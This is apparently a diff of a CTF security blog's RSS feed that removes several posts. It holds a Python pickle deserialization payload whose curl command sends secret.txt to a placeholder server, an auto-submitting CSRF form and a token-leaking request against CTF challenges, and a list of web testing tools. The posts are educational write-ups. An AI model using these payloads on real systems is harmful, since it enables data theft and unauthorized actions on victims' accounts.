-<p>Our class will be deserialized, and make a POST request to a webhook with &ldquo;hello&rdquo; in the request body. This webhook we have access to, so we can see the POST request after deserialization.</p>
-<p>We can extrapolate this example further and open a reverse shell, or have the program unintentially pipe sensitive files to a server we control.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Secret</span>(object):
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> (os<span style="color:#f92672">.</span>system, (<span style="color:#e6db74">&#34;curl http://your.server.HERE --data </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">$(cat secret.txt)</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>, ))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>EvilExample <span style="color:#f92672">=</span> Secret()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>pickle<span style="color:#f92672">.</span>dump(EvilExample, open(<span style="color:#e6db74">&#34;secret.p&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>))
-</span></span></code></pre></div><p>Let&rsquo;s say that there&rsquo;s a file called <code>secret.txt</code> in the directory of the application that looks like so:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>this is a secret~
-</span></span></code></pre></div><p>When we submit the generated file from this script (<code>secret.p</code>) and request for it, we can see in our webhook that the contents of <code>secret.txt</code> have succesfully been outputed to us in the body of a POST request:</p>
-
-    <img src="/images/InsecureDeserializationIntro_secret.png"  alt="secret"  class="center"  style="border-radius: 8px;"  />
-
-
-<p>The possibilities are endless. Of course, this is just a toy application I&rsquo;m running locally to showcase this, but regardless the dangers are still plain to see. RCE is remarkably easy to achieve and scarily straightforward to do if your deserializer is not properly secured. In fact, that&rsquo;s part of the exploit used in hacking <a href="/posts/2020/11/dragonctf-2020-harmony-chat/">DragonCTF&rsquo;s Harmony Chat</a>, although their serializer was a Javascript variant, not a Python one.</p>
-<p>So what&rsquo;s the takeaway here? If you can help it, never deserialize user-provided input. Of course, there do exist situations where you absolutely cannot avoid it, and I would recommend properly sanitized input or some signature that can act as a canary should anything in the user input change.</p>
-<p>Insecure deserialization is a pretty dangerous vulnerability, and also a pretty easy one to exploit if you know where to look for it. As mentioned earlier, it&rsquo;s seeing prolific exposure in the CTF world, and justifiably so - there are many <a href="https://www.linkedin.com/pulse/equifax-data-breach-apache-struts-vulnerability-kenneth-g-/">real world vulnerabilities</a> today that are based on serialization functionality but don&rsquo;t have the security to match up for it. If you&rsquo;re using serialization libraries or modules, make sure to be careful!</p>
 <p><strong>Vie</strong></p>
 ]]></content>
         </item>
@@ -2379,140 +2189,6 @@ We now have all the tools required to exploit this challenge.</p>
 </ol>
 <p><code>flag{one_write_two_write_good_write_bad_write}</code></p>
 <p>Jam</p>]]></content>
-        </item>
-        
-        <item>
-            <title>Cross-Site Request Forgery: Introduction</title>
-            <link>https://jamvie.net/posts/2020/07/cross-site-request-forgery-introduction/</link>
-            <pubDate>Mon, 27 Jul 2020 19:07:51 -0600</pubDate>
-            
-            <guid>https://jamvie.net/posts/2020/07/cross-site-request-forgery-introduction/</guid>
-            <description>Cross-Site Request Forgery is a common and prolific exploit that takes advantage of sessional cookies that browsers automatically allocate to HTTP requests - and they&amp;rsquo;re the reason you shouldn&amp;rsquo;t click suspicious links, even if the URL sort of sounds legitimate.
-This is a discussion on the importance of protecting against such attacks, and to demystify the unknowns that many people have about the exploit in general. I will be using my solution for two challenges I did in the past to help explain my points - the writeups for which you can consult here as well.</description>
-            <content type="html"><![CDATA[<p>Cross-Site Request Forgery is a common and prolific exploit that takes advantage of sessional cookies that browsers automatically allocate to HTTP requests - and they&rsquo;re the reason you shouldn&rsquo;t click suspicious links, even if the URL sort of sounds legitimate.</p>
-<p>This is a discussion on the importance of protecting against such attacks, and to demystify the unknowns that many people have about the exploit in general. I will be using my solution for two challenges I did in the past to help explain my points - the writeups for which you can consult here as well.</p>
-<h2 id="lets-begin">Let&rsquo;s Begin!</h2>
-<p>CSRF attacks are exploits that trick users into unknowingly performing actions that they didn&rsquo;t intend/consent to perform. They work through using your credentials without you actually knowing - through the use of automatic additions of your session ID to browser cookies in HTTP requests. How, specifically, do the CSRF exploits work?</p>
-<p>Consider my writeup for the challenge &ldquo;<a href="/posts/2020/06/redpwnctf-2020-part-2/#cookie-recipes-v2">cookie-recipes-v2</a>&rdquo; from Redpwnctf 2020. The challenge called for us to execute multiple CSRF attacks - but the reason why we wanted to do a CSRF attack and not an XSS attack (the two are quite similar) lies in the architecture of the underlying server.</p>
-<p>The premise of the challenge was that you could &ldquo;purchase&rdquo; the flag in the program if you had enough virtual credits to do so - the price for buying the flag was around 1000 credits, but when you make an account, you start with only 200 (or 100?). At first glance, there are no ways to gain more credits, and so you were out of luck. However, in the infrastructure of the application, there exists a certain API endpoint called <code>/gift</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>[<span style="color:#e6db74">&#39;gift&#39;</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">method</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;POST&#39;</span>) {
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">405</span>);
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> {
-</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;success&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>
-</span></span><span style="display:flex;"><span>        };
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Get token from cookie
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cookies</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">parseCookies</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">headers</span>.<span style="color:#a6e22e">cookie</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">cookies</span>.<span style="color:#a6e22e">has</span>(<span style="color:#e6db74">&#39;token&#39;</span>)) {
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">respondJSON</span>(<span style="color:#a6e22e">res</span>, <span style="color:#ae81ff">200</span>, <span style="color:#a6e22e">result</span>);
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">cookies</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;token&#39;</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span>(<span style="color:#a6e22e">token</span>) <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;string&#39;</span>) {
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">error</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Invalid token&#39;</span>;
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">respondJSON</span>(<span style="color:#a6e22e">res</span>, <span style="color:#ae81ff">401</span>, <span style="color:#a6e22e">result</span>);
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Get id from token
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">id</span>;
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">id</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">getId</span>(<span style="color:#a6e22e">token</span>);
-</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">500</span>);
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">id</span>) {
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">error</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Invalid token&#39;</span>;
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">respondJSON</span>(<span style="color:#a6e22e">res</span>, <span style="color:#ae81ff">401</span>, <span style="color:#a6e22e">result</span>);
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Make sure request is from admin
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">try</span> {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">isAdmin</span>(<span style="color:#a6e22e">id</span>)) {
-</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">403</span>);
-</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span>;
-</span></span><span style="display:flex;"><span>            }
-</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">500</span>);
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Get target user id from url
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">user_id</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">parseParams</span>(<span style="color:#a6e22e">req</span>).<span style="color:#a6e22e">id</span>;
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">user_id</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;string&#39;</span>) {
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">400</span>);
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>[...]
-</span></span></code></pre></div><p>This endpoint was only relevant to the admin, who they could specify a user to gift tokens to. This is a <strong>state-changing action of interest</strong> to us, a hallmark signal that a CSRF exploit is at play here. CSRFs work by carrying out relevant actions that change some aspect of the program for us - doing so whilst using the permissions of a user without that user ever authorizing.</p>
-<p>The first few checks in the endpoint are important to focus on: in order to validate that the user calling this endpoint has admin privileges, the server extracts a token ID from the cookies that are packaged in the request - cookies that are automatically added by the client. In these cookies exist sessional-based IDs, and they help to identify a person utilizing an application. However, if this application only relies on cookie-based user verification to verify their users, CSRF vulnerabilities will occur. This seems good on paper: if you don&rsquo;t have the correct token ID from the browser/client-added cookie packaged in the request, then your request will be denied, because you need the same ID as the valid user, which is only in use when the user is currently utilizing the application. However, if it&rsquo;s the only form of checking that a program does, a malicious hacker can easily bypass that check. This is where the language &ldquo;perform actions that the user didn&rsquo;t authorize&rdquo; becomes important. In a CSRF attack, you&rsquo;re the one making the request, you just don&rsquo;t know that you&rsquo;re making it.</p>
-<p>Back to my REDPWNCTF example, consider this webpage, crafted and hosted by a hacker:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTML" data-lang="HTML"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
-</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">body</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=1234567890&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">form</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span>&gt;
-</span></span><span style="display:flex;"><span>      document.<span style="color:#a6e22e">forms</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">submit</span>();
-</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;
-</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">body</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
-</span></span></code></pre></div><p>When someone visits this webpage and the browser loads it, the form in the webpage is automatically constructed, and the <code>&lt;script&gt;</code> tag ensures its sent immediately. If any user who doesn&rsquo;t have admin priviliges visits this webpage and makes a POST request unknowingly, their sessional id that is automatically added into the request by the browser will be extracted from their cookie by the server, and their request will be rejected. Thus, nothing will happen when we non-admin users visit. However, if an admin visits this webpage, their id that is extracted from their cookie will be validated, and the request will be accepted. All the admin did was simply visit the webpage in question - the request was sent, using the admin&rsquo;s credentials without the them ever knowing or consenting. The request, once validated, will fire the endpoint and do all the necessary actions - and the user with the ID &ldquo;1234567890&rdquo; will be gifted credits.</p>
-<p>There&rsquo;s alot more to this challenge than just the CSRF exploit - so I encourage you to read my <a href="/posts/2020/06/redpwnctf-2020-part-2/#cookie-recipes-v2">writeup</a> on it if you would like to learn more about it.</p>
-<hr>
-<p>Now, there exists a common technique that helps to prevent CSRF attacks, known as CSRF tokens.</p>
-<p>CSRF tokens violate two main paradigms that would typically ensure the success of a CSRF attack: making some aspect of the request parameters in doing a state-changing action unpredictable, and additionally needing more than just the cookie session ID to validate a user.</p>
-<p>The tokens are values that which are unpredictable - consider them to be variables like passwords, and thus are only as effective as the number of bits of entropy is high.</p>
-<p>CSRF tokens work through being generated from the server, and transmitted back to the client. The client must then include this secret value into their next HTML request back to the server - if that value is malformed or missing, the server rejects the request regardless if that user&rsquo;s session ID from the cookie was validated in it. The generation of the token can be once per user, or once per new request. Typically, adding this extra level of verification to all state-changing requests are a good way to mitigate any possible CSRF exploits in your application. However, the use of these tokens must also be treated with caution, for they can be trivial to bypass if not implemented correctly.</p>
-<p>As an example, consider my other writeup for the challenge &ldquo;<a href="/posts/2020/07/redpwnctf-2020-part-3/">Viper</a>&rdquo;, also from REDPWNCTF 2020. The premise of that challenge focused mainly on another vulnerability known as cache-poisoning, but at its core, the use of poisoning was a vehicle to deliver a CSRF attack. We wanted to utilize an API endpoint that was only relevant if visited by an admin. The endpoint in question would change the contents of a webpage if it was called. This challenge also employed CSRF tokens that would shut down any basic attempts at unauthorized request making, which were generated by an RNG function. Consider the provided code found in Viper&rsquo;s infrastructure:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/analytics&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">ip_address</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">ip_address</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>(...)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">exists</span>(<span style="color:#a6e22e">ip_address</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">reply</span>) {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">reply</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">1</span>) {
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">incr</span>(<span style="color:#a6e22e">ip_address</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">reply</span>) {
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">err</span>){
-</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Something went wrong&#34;</span>);
-</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span>;
-</span></span><span style="display:flex;"><span>                }
-</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">200</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Success! &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">ip_address</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; has visited the site &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">reply</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; times.&#34;</span>);
-</span></span><span style="display:flex;"><span>            });
-</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">set</span>(<span style="color:#a6e22e">ip_address</span>, <span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">reply</span>) {
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">err</span>){
-</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Something went wrong&#34;</span>);
-</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span>;
-</span></span><span style="display:flex;"><span>                }
-</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">200</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Success! &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">ip_address</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; has visited the site 1 time.&#34;</span>);
-</span></span><span style="display:flex;"><span>            });
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    });
-</span></span><span style="display:flex;"><span> });
-</span></span></code></pre></div><p>The token in this challenge is a randomly generated number, that is between 10000-1000000000 bits long. There is no efficient way to brute-force its value. That being said, the mishandling of such tokens is one of the vulnerabilities we are meant to exploit in this challenge.
-Tokens should not be passed around in multiple areas of the infrastructure where it could possibly be leaked. Ideally, you would want your token values to be dynamically generated unique to your user/request, and then discarded afterwards. However, the Viper challenge employed a cache which kept the admin&rsquo;s CSRF token, which was dynamically changing based on the number of times the admin visited the page, inside it with a trivially easy-to-figure-out cache key(&quot;__csrftoken__admin_account&quot;). If you wanted to grab the CSRF token, you just needed to make a request with the correct cache key formatted in your request params to recieve the CSRF token.
-With this, you could construct a CSRF attack as normal, including the token to bypass that additional check.</p>
-<pre tabindex="0"><code>curl http://2020.redpwnc.tf:31291/analytics?ip_address=__csrftoken__admin_account
-</code></pre>
-    <img src="/images/REDPWN2020_ViperCSRF.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />
-
-
-<p>It&rsquo;s important to guard against CSRF attacks - they&rsquo;re prolific and yet, despite plenty of security researchers implementing different ways to protect against them, they still pop up. The reason why you shouldn&rsquo;t click on any suspicious unverified link is due to the possibility that the application the link could be spoofing is vulnerable against CSRF attacks - the webpage you will be directed to could look like my simplified HTML webpage above, with a request constructed behind the scenes and sent to the server with your credentials/validation stamped on it. Once you visit that webpage, you unfortunately wouldn&rsquo;t be able to do anything to undo or &ldquo;unsend&rdquo; that request. CSRF attacks could install applications into your computer without your knowledge via downloading the source online, they could change your email address or rescind privileges from users - if there exists an action that is initiated from an HTTP request, then a CSRF attack can happen from it. Of course, CSRF attacks aren&rsquo;t the only thing that you&rsquo;d have to worry about if you click a suspicious link - we still need to worry about Cross-Site Scripting attacks (XSS), but that might be an article for some other time.</p>
-<p>Jam</p>
-]]></content>
         </item>
         
         <item>
@@ -3994,46 +3670,6 @@ RETR payload.txt
 </code></pre><p>NOTE: Doing it this way means the FTP server was establishing a connection with the rabbitmq one. However, multiple times I tried this the TCP connection would close immediately after I send my request! I worked around this by sending in a bunch of garbage in my payload.txt file alongside the actual payload, so that at least the TCP connection would have to spend time sending all of that data(think: an unending stream of AAAAAs), and persist long enough for the reponse to be recieved.</p>
 <p>This was a fun way to learn how FTP servers work and how protocols of the internet operate! I&rsquo;m upset that I didn&rsquo;t have the time to participate when it happened, but nonetheless this was a great challenge :)</p>
 <p>Jam</p>]]></content>
-        </item>
-        
-        <item>
-            <title>Commonly Used Software</title>
-            <link>https://jamvie.net/posts/2020/04/commonly-used-software/</link>
-            <pubDate>Sun, 26 Apr 2020 01:30:30 -0600</pubDate>
-            
-            <guid>https://jamvie.net/posts/2020/04/commonly-used-software/</guid>
-            <description>&lt;p&gt;I really like web-based exploits, so I focus primarily on the web challenges when my team and I participate in CTFs.&lt;/p&gt;</description>
-            <content type="html"><![CDATA[<p>I really like web-based exploits, so I focus primarily on the web challenges when my team and I participate in CTFs.</p>
-<p>I typically take over the web challenges while my teammates delve into other topics - sometimes I look at the pwn problems, and hopefully I&rsquo;ll include some pwn writeups here! Eventually :P Anyway, as someone who focuses on web stuff, I found myself constantly utilizing the same types of tools and software to help me with challenges. I thought I&rsquo;d share them here!</p>
-<p>Web exploits are broad in topic and there definitely doesn&rsquo;t exist one tool for all sploits. However, as I got exposed to more challenges I found patterns in the problems. These patterns indicated the vulnerability that I should be taking advantage of, and therefore, what types of tools I needed to further investigate those vulnerabilities.</p>
-<p>However, before I get into the list I would like to make a statement about the nature of this post. This is NOT a cheatsheet on how to hack into your friend&rsquo;s facebook. &ldquo;Hacking&rdquo; for malicious purposes is illegal and can cost you <a href="https://criminal.findlaw.com/criminal-charges/hacking-laws-and-punishments.html">jail time and hefty fines</a>.</p>
-<p><strong>I will not divulge information on how to compromise the privacy of individuals without their consent.</strong>
-This is a CTF and ethical hacking blog only - what this post is, is a list of tools I found useful when scoping out web challenges for various CTFs!</p>
-<h2 id="lets-begin">Let&rsquo;s Begin!</h2>
-<p><em>These are not ordered by priority or &ldquo;most utilized&rdquo;.</em></p>
-<hr>
-<h2 id="curl">cURL</h2>
-<p>A must! <a href="https://curl.haxx.se/">cURL</a> is short for &ldquo;Client URL&rdquo;. It&rsquo;s a simple and lightweight command-line tool to transfer data using various network protocols. I use it for basic GET and POST HTTP requests, but its so versatile it can be used for much more! In its simplest form, cURL is amazing to send data to and from a specified server.</p>
-<p><a href="https://jamvie.net/posts/02confidence2020_01/">In my CONfidence 2020 write-up for the &ldquo;Cat Web&rdquo; problem</a>, I use cURL heavily to examine the response data from the server with each post request I make.</p>
-<h2 id="wireshark">Wireshark</h2>
-<p>I gained knowledge in <a href="https://www.wireshark.org/">Wireshark</a> back in my internet computing course days. I recieved a tutorial on the basics of how to use this software - it&rsquo;s a protocol analyzer designed to examine web traffic and capture packet data between two endpoints. This software can show and display packets on all levels of the OSI hierarchy structure - you can see your common HTTP packets, TCP, DNS, to name a common few&hellip;</p>
-<p>Plenty of forensic-based problems will give you a capture of internet traffic and hide a flag in there, so wireshark is useful even beyond the web challenges I use it for!</p>
-<h2 id="burpsuite">Burpsuite</h2>
-<p>From <a href="https://portswigger.net/support/how-to-use-burp-suite">PortSwigger, creators of BurpSuite</a>:</p>
-<blockquote>
-<p>Burp Suite is an integrated platform for performing security testing of web applications. It is designed to be used by hands-on testers to support the testing process.</p>
-</blockquote>
-<p>Burp Suite is perfect for testing out all sorts of exploits. It has much more use in testing non-production projects by enterprisal companies, and its a powerful tool for scoping out any possible vulnerabilities of an application. The community version comes with all the basic and necessary tools a CTFer or pentester would need to gauge the security of their application - often, i use it as a proxy when I&rsquo;m trying to scope our API vulnerabilities.</p>
-<p>Back in my <a href="https://jamvie.net/posts/01utctf01/">UTCTF &ldquo;Epic Admin Pwn&rdquo; writeup</a>, I mentioned using Burp Suite to scope out the SQLi attack vector and using SQLmap to further exploit it - which is a much faster way than creating your own script to utilize the attack vector that was found in it!</p>
-<h2 id="postman">Postman</h2>
-<p>If I need to send more complex requests that might make cURL more complex to use, <a href="https://www.postman.com/">Postman</a> is my go to software. I don&rsquo;t just use Postman to send heavier requests to a server, it&rsquo;s also great for testing out RESTful APIs if you&rsquo;re creating one for a personal project. It has a clean UI and is extremely beginner-friendly, so Postman is my go-to for literally anything requiring RESTful API testing.</p>
-<h2 id="sqlmap">SQLMap</h2>
-<p>SQLmap is a suite of great utilities specifically for SQL-injection based attacks. It automates the detection and exploitation of any SQL-based flaws in an application. It supports most if not all major databases (MySQL, SQLite, etc) and can do everything from simple detection to database table dumping.</p>
-<hr>
-<p>While this is not an exhaustive list of all the tools I use, these are definitely among the most commonly used softwares that I go to when I need to test and utilize any vulnerabilities in a given CTF challenge. I hope these prove useful to you!</p>
-<p>Jam</p>
-<h2 id="references">References</h2>
-<p><a href="https://knowyourmeme.com/memes/hackerman">Feature Image</a></p>]]></content>
         </item>
         
         <item>
